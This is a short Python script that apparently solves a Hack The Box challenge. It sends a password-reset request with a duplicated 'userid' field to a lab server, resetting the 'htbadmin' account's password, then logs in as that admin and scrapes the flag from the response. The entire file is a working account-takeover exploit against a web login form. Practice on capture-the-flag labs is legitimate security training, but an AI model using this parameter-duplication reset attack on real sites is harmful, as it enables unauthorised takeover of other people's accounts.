import requests 
import re

url = "http://178.62.61.132:32175/"
passwd = "htbuser"
session = requests.Session()
data = {
	"oldpasswd": passwd,
	"newpasswd": passwd,
	"confirm": passwd,
	"userid": "htbuser",
	"userid": "htbadmin",
	"submit": "doreset"
}

r = session.post(url, data=data)

data = {
	"userid": "htbadmin",
	"passwd": passwd,
	"submit": "submit"
}
r = session.post(url, data=data)
answer = re.findall(r'there is your flag! (.*)</strong>', r.text)[0]
print(answer)